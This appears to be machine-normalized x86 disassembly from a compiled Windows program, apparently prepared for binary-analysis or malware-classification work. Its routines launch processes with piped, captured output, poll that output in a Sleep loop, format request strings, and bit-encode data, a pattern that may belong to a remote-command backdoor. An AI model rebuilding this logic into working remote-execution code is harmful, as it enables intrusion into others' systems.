mov eax [ ebp - 0x220c ]
mov al [ eax ]
mov [ ebp - 0x2211 ] al
inc [ ebp - 0x220c ]
cmp [ ebp - 0x2211 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220c ]
sub eax [ ebp - 0x2210 ]
mov ecx [ ebp - 0x2210 ]
mov [ ebp - 0x2218 ] ecx
mov [ ebp - 0x221c ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0xc ]
dec eax
mov [ ebp - 0x2220 ] eax
mov eax [ ebp - 0x21e8 ]
mov al [ eax ]
mov [ ebp - 0x21ed ] al
inc [ ebp - 0x21e8 ]
cmp [ ebp - 0x21ed ] 0x0
jne r-xdata
mov eax [ ebp - 0x21e8 ]
sub eax [ ebp - 0x21ec ]
mov ecx [ ebp - 0x21ec ]
mov [ ebp - 0x21f4 ] ecx
mov [ ebp - 0x21f8 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x21fc ] eax
mov eax [ ebp - 0x21c4 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x21c5 ] al
inc [ ebp - 0x21c4 ]
cmp [ ebp - 0x21c5 ] 0x0
jne r-xdata
mov edi [ ebp - 0x21c4 ]
mov esi [ ebp - 0x21bc ]
mov eax [ ebp - 0x21c0 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x216c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x216d ] al
inc [ ebp - 0x216c ]
cmp [ ebp - 0x216d ] 0x0
jne r-xdata
mov edi [ ebp - 0x216c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2174 ] eax
mov eax [ ebp - 0x2164 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2165 ] al
inc [ ebp - 0x2164 ]
cmp [ ebp - 0x2165 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2164 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x2154 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2155 ] al
inc [ ebp - 0x2154 ]
cmp [ ebp - 0x2155 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2154 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x215c ] eax
mov eax [ ebp - 0x214c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x214d ] al
inc [ ebp - 0x214c ]
cmp [ ebp - 0x214d ] 0x0
jne r-xdata
mov edi [ ebp - 0x214c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x225c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x225d ] al
inc [ ebp - 0x225c ]
cmp [ ebp - 0x225d ] 0x0
jne r-xdata
mov edi [ ebp - 0x225c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x2220 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2221 ] al
inc [ ebp - 0x2220 ]
cmp [ ebp - 0x2221 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2220 ]
mov esi [ ebp - 0x2218 ]
mov eax [ ebp - 0x221c ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2228 ] eax
mov eax [ ebp - 0x21fc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x21fd ] al
inc [ ebp - 0x21fc ]
cmp [ ebp - 0x21fd ] 0x0
jne r-xdata
mov edi [ ebp - 0x21fc ]
mov esi [ ebp - 0x21f4 ]
mov eax [ ebp - 0x21f8 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp - 0x2174 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2175 ] al
inc [ ebp - 0x2174 ]
cmp [ ebp - 0x2175 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2174 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x215c ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x215d ] al
inc [ ebp - 0x215c ]
cmp [ ebp - 0x215d ] 0x0
jne r-xdata
mov edi [ ebp - 0x215c ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x2228 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2229 ] al
inc [ ebp - 0x2228 ]
cmp [ ebp - 0x2229 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2228 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2088 ]
mov [ ebp - 0x2230 ] eax
mov eax [ ebp - 0x2230 ]
mov [ ebp - 0x2234 ] eax
mov eax [ ebp - 0x2230 ]
mov al [ eax ]
mov [ ebp - 0x2235 ] al
inc [ ebp - 0x2230 ]
cmp [ ebp - 0x2235 ] 0x0
jne r-xdata
mov eax [ ebp - 0x2230 ]
sub eax [ ebp - 0x2234 ]
mov ecx [ ebp - 0x2234 ]
mov [ ebp - 0x223c ] ecx
mov [ ebp - 0x2240 ] eax
mov eax [ ebp - 0x20d0 ]
mov eax [ eax + 0x10 ]
dec eax
mov [ ebp - 0x2244 ] eax
mov eax [ ebp - 0x2244 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x2245 ] al
inc [ ebp - 0x2244 ]
cmp [ ebp - 0x2245 ] 0x0
jne r-xdata
mov edi [ ebp - 0x2244 ]
mov esi [ ebp - 0x223c ]
mov eax [ ebp - 0x2240 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
sub_4032d0
push ebp
mov ebp esp
mov eax 0x1080
call sub_409800
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1080 ] ecx
mov eax [ ebp - 0x1080 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x9 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
call memset
add esp 0xc
mov [ ebp - 0x102c ] 0xc
and [ ebp - 0x1028 ] 0x0
mov [ ebp - 0x1024 ] 0x1
push 0x0
lea eax [ ebp - 0x102c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
call [ GetTickCount@IAT ]
xor edx edx
mov ecx 0x2710
div ecx
push edx
push r--data
call printf
pop ecx
pop ecx
mov [ ebp - 0x1078 ] 0x44
lea eax [ ebp - 0x1078 ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1038 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x103c ] eax
xor eax eax
mov [ ebp - 0x1048 ] ax
mov [ ebp - 0x104c ] 0x101
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1078 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
push [ ebp + 0x14 ]
push [ ebp - 0x1c ]
call [ WaitForSingleObject@IAT ]
and [ ebp - 0x107c ] 0x0
and [ ebp - 0xc ] 0x0
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
call memset
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0x20 ]
xor ecx ebp
call sub_4097f0
leave
retn 0x10
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0xc ] 0xb800
jbe r-xdata
cmp [ ebp - 0x107c ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xc ]
mov [ eax ] 0x2e
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xc ]
mov [ eax ] 0x2e
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xc ]
mov [ eax ] 0x2e
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xc ]
mov [ eax ] 0x0
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x107c ]
push eax
push 0x1000
mov eax [ ebp + 0xc ]
add eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x107c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x1080 ]
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x9 ]
test eax eax
je r-xdata
jmp r-xdata
call [ GetTickCount@IAT ]
xor edx edx
mov ecx 0x2710
div ecx
push edx
push r--data
call printf
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp - 0x107c ]
push eax
push 0x1000
lea eax [ ebp - 0x1020 ]
push eax
push [ ebp - 0x8 ]
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
sub_4034f9
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x18 ] 0x4001
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x5 ] 0x0
leave
retn 0xc
mov eax [ ebp - 0x18 ]
and eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x1
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x24 ] 0x0
jmp r-xdata
cmp [ ebp - 0x24 ] 0xf
jge r-xdata
mov eax [ ebp - 0x20 ]
shl eax 0x1
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
and eax 0x8000
je r-xdata
mov eax [ ebp - 0x10 ]
and eax [ ebp - 0x14 ]
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
or eax 0x80
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x10 ]
shl eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
not eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x8
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax 0x1
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
mov al [ ebp - 0x5 ]
shr al 0x1
mov [ ebp - 0x5 ] al
jmp r-xdata
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x4 ]
mov cl [ ebp - 0x5 ]
mov [ eax ] cl
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
and [ ebp - 0xc ] 0x0
jmp r-xdata
sub_4035d4
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x14 ]
call sub_404952
mov eax [ ebp - 0x14 ]
mov [ eax ] r--data
push 0x100000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xdc ] ecx
push 0x100000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xe0 ] ecx
push 0x100000
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0xe4 ] ecx
push 0xa
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0xf0 ] ecx
mov eax [ ebp - 0x14 ]
mov edi [ eax + 0xf0 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
leave
retn
sub_403686
push ebp
mov ebp esp
sub esp 0x48
push esi
push edi
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x1c ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x1c ]
push [ eax + 0x94 ]
call sprintf
add esp 0xc
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x1c ]
call sub_404bd5
cmp eax 0x1
jge r-xdata
push r--data
mov eax [ ebp - 0x1c ]
push [ eax + 0x8c ]
call sub_401629
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call printf
pop ecx
xor al al
jmp r-xdata
push r--data
mov eax [ ebp - 0x1c ]
push [ eax + 0x88 ]
call sub_401629
pop ecx
pop ecx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push r--data
call printf
pop ecx
xor al al
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
push 0x400
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
xor al al
jmp r-xdata
mov al 0x1
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_405609
pop ecx
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
inc eax
mov [ ebp - 0x40 ] eax
push [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
call sub_40470f
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x3c ]
mov al [ eax ]
mov [ ebp - 0x41 ] al
inc [ ebp - 0x3c ]
cmp [ ebp - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax + 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax ]
mov [ ebp - 0x25 ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp - 0x34 ] eax
push [ ebp - 0xc ]
push r--data
push r--data
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
call sub_4051d0
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x34 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x35 ] al
inc [ ebp - 0x34 ]
cmp [ ebp - 0x35 ] 0x0
jne r-xdata
mov edi [ ebp - 0x34 ]
mov esi [ ebp - 0x2c ]
mov eax [ ebp - 0x30 ]
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_40382d
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov al 0x1
leave
retn 0x4
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x42
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x11 ]
mov [ eax ] cl
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
sub_40387b
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
push [ eax + 0xf0 ]
push r--data
push r--data
call printf
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax 0x10
push eax
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
add eax 0x42
push eax
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x58 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x8 ] r--data
jmp r-xdata
push [ ebp - 0x8 ]
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
add eax 0x42
push eax
push r--data
call printf
pop ecx
pop ecx
leave
retn
sub_403914
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov [ ebp - 0x8 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_4045ad
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x320 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x321 ] 0x0
push 0x400
push 0x0
mov eax [ ebp - 0x8 ]
push [ eax + 0x98 ]
call memset
add esp 0xc
push [ ebp - 0x4 ]
push 0x11
mov ecx [ ebp - 0x8 ]
call sub_405b6a
push eax
mov eax [ ebp - 0x8 ]
add eax 0x42
push eax
push 0x8
mov ecx [ ebp - 0x8 ]
call sub_405b6a
push eax
push 0xa
mov ecx [ ebp - 0x8 ]
call sub_405aed
push eax
mov eax [ ebp - 0x8 ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x8 ]
push [ eax + 0x94 ]
call sprintf
add esp 0x20
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0xd ] al
inc [ ebp - 0xc ]
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x3a
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x15 ] al
inc [ ebp - 0x14 ]
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov edi [ ebp - 0x14 ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
push [ eax + 0x98 ]
push 0x0
mov eax [ ebp - 0x8 ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x8 ]
call sub_404d9e
mov al 0x1
pop edi
pop esi
leave
retn 0x4
sub_403a1f
push ebp
mov ebp esp
sub esp 0x34
push esi
push edi
mov [ ebp - 0x14 ] ecx
push 0x400
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x98 ]
call memset
add esp 0xc
push 0x11
mov ecx [ ebp - 0x14 ]
call sub_405b6a
push eax
mov eax [ ebp - 0x14 ]
add eax 0x42
push eax
push 0x8
mov ecx [ ebp - 0x14 ]
call sub_405b6a
push eax
push 0xa
mov ecx [ ebp - 0x14 ]
call sub_405aed
push eax
mov eax [ ebp - 0x14 ]
add eax 0x10
push eax
push r--data
mov eax [ ebp - 0x14 ]
push [ eax + 0x94 ]
call sprintf
add esp 0x1c
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x19 ] al
inc [ ebp - 0x18 ]
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov edi [ ebp - 0x18 ]
push 0x3a
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x98 ]
dec eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x21 ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
mov edi [ ebp - 0x20 ]
push 0x6
pop ecx
mov esi r--data
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ ebp - 0x2d ] al
inc [ ebp - 0x28 ]
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x34 ]
inc eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4054b8
pop ecx
pop ecx
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
call sub_4045ad
push eax
push r--data
mov eax [ ebp - 0x14 ]
push [ eax + 0xa4 ]
call sprintf
add esp 0xc
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0x98 ]
push 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0xa4 ]
mov eax [ ebp - 0x14 ]
push [ eax + 0x94 ]
mov ecx [ ebp - 0x14 ]
call sub_405294
cmp eax 0xffffffff
je r-xdata
xor al al
mov al 0x1
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
sub_403b96
push ebp
mov ebp esp
sub esp 0x80
push esi
push edi
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
xor al al
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x57 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x56 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx [ ebp - 0x14 ]
call [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx [ ebp - 0x14 ]
call [ eax + 0x24 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x4 ]
and eax 0x80000003
jns r-xdata
xor eax eax
inc eax
je r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
inc [ ebp - 0x18 ]
cmp [ ebp - 0x1d ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov edi [ eax + 0xec ]
mov esi [ ebp - 0xc ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov eax [ ebp - 0x50 ]
mov al [ eax ]
mov [ ebp - 0x55 ] al
inc [ ebp - 0x50 ]
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x54 ]
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x5c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax + 0xe8 ]
mov esi [ ebp - 0x10 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x4c ] eax
push [ ebp - 0x4c ]
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
jmp r-xdata
dec eax
or eax 0xfffffffc
inc eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x4 ]
and eax 0x80000003
jns r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x60 ]
inc eax
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x4 ]
and eax 0x80000003
jns r-xdata
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ ebp - 0x2d ] al
inc [ ebp - 0x28 ]
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
push [ ebp - 0x34 ]
push [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xec ]
call memcpy
add esp 0xc
mov eax [ ebp - 0xc ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
inc eax
mov [ ebp - 0x3c ] eax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x80 ] eax
push [ ebp - 0x80 ]
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
dec eax
or eax 0xfffffffc
inc eax
mov eax [ ebp - 0x60 ]
mov al [ eax ]
mov [ ebp - 0x65 ] al
inc [ ebp - 0x60 ]
cmp [ ebp - 0x65 ] 0x0
jne r-xdata
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x64 ]
mov [ ebp - 0x6c ] eax
push [ ebp - 0x6c ]
push [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
push [ eax + 0xe8 ]
call memcpy
add esp 0xc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x70 ]
inc eax
mov [ ebp - 0x74 ] eax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x48 ] eax
push [ ebp - 0x48 ]
push r--data
call printf
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
call [ Sleep@IAT ]
jmp r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov eax [ ebp - 0x38 ]
mov al [ eax ]
mov [ ebp - 0x3d ] al
inc [ ebp - 0x38 ]
cmp [ ebp - 0x3d ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
sub eax [ ebp - 0x3c ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xec ]
mov ecx [ ebp - 0x44 ]
mov [ eax + ecx ] 0x0
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x70 ]
mov al [ eax ]
mov [ ebp - 0x75 ] al
inc [ ebp - 0x70 ]
cmp [ ebp - 0x75 ] 0x0
jne r-xdata
mov eax [ ebp - 0x70 ]
sub eax [ ebp - 0x74 ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0xe8 ]
mov ecx [ ebp - 0x7c ]
mov [ eax + ecx ] 0x0
mov al 0x1
jmp r-xdata
jmp r-xdata
sub_403e45
push ebp
